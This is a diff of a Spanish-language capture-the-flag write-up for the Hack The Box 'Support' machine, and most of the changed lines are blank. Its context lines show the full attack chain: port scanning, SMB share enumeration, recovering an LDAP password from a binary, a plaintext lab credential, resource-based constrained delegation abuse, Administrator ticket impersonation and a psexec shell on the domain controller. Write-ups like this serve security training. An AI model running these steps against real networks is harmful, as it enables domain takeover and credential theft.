@@ -28,10 +28,14 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn x.x.x.x -oG allports
 
 
 
+
+
 ```bash
 extractPorts allports
 ```
 ![](assets/img/htb-writeup-support/2.png)
+
+
 
 
 
@@ -44,6 +48,8 @@ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,4
 
 
 
+
+
 ## enumeración por smb
 
 ```bash
@@ -53,16 +59,22 @@ smbclient -L 10.129.117.62 -N
 
 
 
+
+
 ```bash
 smbmap -H 10.129.117.62 -u none
 ```
 ![](assets/img/htb-writeup-support/5.png)
 
 
+
+
 ````bash
 nxc smb 10.129.117.62
 ````
 ![](assets/img/htb-writeup-support/6.png)
+
+
 
 
 + añadimos los dominios las comunes de AD al ``/etc/host`` 
@@ -72,15 +84,21 @@ echo '10.129.117.62 dc dc.support.htb support.htb' >> /etc/hosts
 ![](assets/img/htb-writeup-support/7.png)
 
 
+
+
 ```bash
 smbclient //10.129.117.62/support-tools -N
 ```
 ![](assets/img/htb-writeup-support/7.5.png)
 
 
+
+
 + dentro de ``smbclient`` descargamos el ``UserInfo.exe.zip`` con ``get Userinfo`` y lo extraemos con ``unzip``.
 
 ![](assets/img/htb-writeup-support/8.png)
+
+
 
 + después con ``strings`` listamos la cadena de cadena de texto imprimible del ``UserInfo.exe`` y vemos 
   ``support\ldap``lo que nos indica que en programa usa el protocolo para comunicarse con el DC.
@@ -91,6 +109,8 @@ smbclient //10.129.117.62/support-tools -N
 kerbrute userenum -d support.htb --dc 10.129.117.62 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 ![](assets/img/htb-writeup-support/9.png)
+
+
 
 
 
@@ -152,9 +172,13 @@ C:\Windows\System32\drivers\etc\hosts
 + ![](assets/img/htb-writeup-support/ldap-query.png)
 
 
+
+
 + una vez dentro es seleccionar ``password`` cuando este marcado en verde, damos ``F9`` para hacer un break point en la ejecución para que el programa se detenga en ese punto, recién hay un ``F5``   y nos aparece en un popup lo siguente:
 
 ![](assets/img/htb-writeup-support/pass.png)
+
+
 
 
 + ingresado estos argumentos y aceptamos. 
@@ -168,9 +192,13 @@ C:\Windows\System32\drivers\etc\hosts
 ![](assets/img/htb-writeup-support/break.png)
 
 
+
+
 + tenemos contraseña.
 
 ![](assets/img/htb-writeup-support/pass2.png)
+
+
 
 
 
@@ -241,6 +269,8 @@ rusthound-ce --domain support.htb -u support -p 'Ironside47pleasure40Watchful'
 ![](assets/img/htb-writeup-support/bloodhount.png)
 
 
+
+
 +  para abusar de este priv vamos de nuevo a hacktricks ``Windows Hardening -> Resource-based Constrained Delegation`` bajamos hasta ``Attack``
 
 + pero antes de nesesitamos ``powermad``  
@@ -284,6 +314,8 @@ Get-DomainComputer SERVICEA
 
 ![](assets/img/htb-writeup-support/powerview.png)
 
+
+
 ```powershell
 
 $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
@@ -316,6 +348,8 @@ getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.1
 
 ![](assets/img/htb-writeup-support/TGT.png)
 
+
+
 + con ese ``TGT`` podemos conectarnos con ``psxec`` pero antes hoy que export una variable de entorno para que funcione.
 
 ```bash
@@ -325,6 +359,7 @@ export KRB5CCNAME=Administrator.ccache
 ```bash 
 psexec.py -k dc.support.htb
 ```
+
 
 
 ![](assets/img/htb-writeup-support/psexec.png)
